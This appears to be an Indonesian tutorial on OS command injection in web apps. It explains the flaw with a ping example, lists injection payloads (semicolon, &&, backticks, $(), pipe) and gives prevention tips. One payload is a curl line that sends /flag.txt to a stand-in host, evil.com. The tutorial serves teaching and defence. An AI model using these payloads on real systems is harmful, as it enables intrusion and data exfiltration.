# 💣 Command Injection: Bahaya Eksekusi Perintah Jahat dari Input User

Command Injection adalah salah satu kerentanan serius di aplikasi web yang memungkinkan penyerang menjalankan **perintah sistem operasi** melalui input yang tidak difilter dengan benar.

---

## ❓ Apa Itu Command Injection?

Saat aplikasi web menerima input dari pengguna dan langsung memasukkannya ke perintah sistem (shell) tanpa validasi, penyerang bisa menyisipkan perintah tambahan yang berbahaya.

Misalnya, aplikasi membuat perintah:

```bash
ping 127.0.0.1
````

Tapi jika input user diubah menjadi:

```bash
127.0.0.1 && whoami
```

Maka perintah yang dijalankan jadi:

```bash
ping 127.0.0.1 && whoami
```

Ini berarti setelah ping, server juga akan menjalankan `whoami` — yang berpotensi bocorkan informasi penting.

---

## ⚙️ Bagaimana Cara Kerja Command Injection?

1. Aplikasi menerima input user, misal alamat IP atau nama file.
2. Input itu dimasukkan langsung ke perintah shell tanpa disaring.
3. Penyerang menyisipkan karakter khusus (seperti `&&`, `;`, backtick `` ` ``) untuk memisahkan dan menambahkan perintah baru.
4. Perintah tambahan ini dieksekusi oleh sistem, sehingga penyerang bisa menjalankan apa saja (membaca file, mengirim data keluar, dll).

---

## 🎯 Contoh Payload Umum dan Fungsinya

| Payload               | Contoh                                                    | Fungsi                                                 | 
| --------------------- | --------------------------------------------------------- | ------------------------------------------------------ | 
| Titik koma `;`        | `127.0.0.1; ls`                                           | Menjalankan perintah kedua (ls)                        |
| Double ampersand `&&` | `127.0.0.1 && whoami`                                     | Menjalankan perintah berikutnya jika sebelumnya sukses |
| Backtick `` ` ``      | ``127.0.0.1 && `id` ``                                    | Menjalankan perintah dalam subshell                    |
| Subshell `$()`        | `127.0.0.1 && $(uname -a)`                                | Menjalankan perintah dalam subshell                    |
| Pipe                  |  127.0.0.1 {pipe} ls                                             | Output perintah pertama diteruskan ke perintah kedua   |
| Kirim data            | `127.0.0.1 && curl http://evil.com?data=$(cat /flag.txt)` | Mengirim data rahasia ke server attacker               |

><strong>pipe => "|"
---

## 🛡️ Cara Mencegah Command Injection

* **Jangan pernah langsung masukkan input user ke perintah shell!**
* Gunakan fungsi sanitasi seperti `escapeshellarg()` atau `escapeshellcmd()` (PHP), atau library khusus yang aman.
* Batasi input user hanya pada karakter yang diizinkan (misal hanya angka dan titik untuk IP).
* Gunakan API atau fungsi native untuk operasi file/network, bukan shell command langsung.
* Jalankan aplikasi dengan hak akses minimal untuk membatasi dampak jika ada serangan.
* Gunakan firewall atau filter aplikasi web (WAF) sebagai lapisan tambahan.
